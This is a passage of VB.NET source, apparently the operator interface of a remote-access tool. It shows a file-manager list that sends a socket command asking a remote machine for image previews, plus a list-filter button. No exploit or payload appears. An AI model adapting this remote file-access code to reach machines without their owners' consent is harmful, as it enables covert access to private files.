         Or CClist.FocusedItem.SubItems(2).Text = ".svg" Or CClist.FocusedItem.SubItems(2).Text = ".gif" _
         Or CClist.FocusedItem.SubItems(2).Text = ".bmp" Or CClist.FocusedItem.SubItems(2).Text = ".tif" AndAlso pic1.Visible Then
                S.Send(inuseS, "$" & Class1.Yy & "vi" & Class1.Yy & curPt.Text & "\" & CClist.FocusedItem.Text)
            End If

        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
            RepD("ManagerImagePreview-->" + ex.Message, 0)
        End Try
    End Sub

    Private Sub Button10_Click(sender As Object, e As EventArgs) Handles Button10.Click
        If Not String.IsNullOrEmpty(fmSrc.Text) Then
            For Each itm As ListViewItem In CClist.Items
                If itm.Text.Contains(fmSrc.Text) Then
                    REM
                Else
                    itm.Remove()
                End If
            Next
        Else
            fm_smethod1()
        End If
    End Sub
End Class
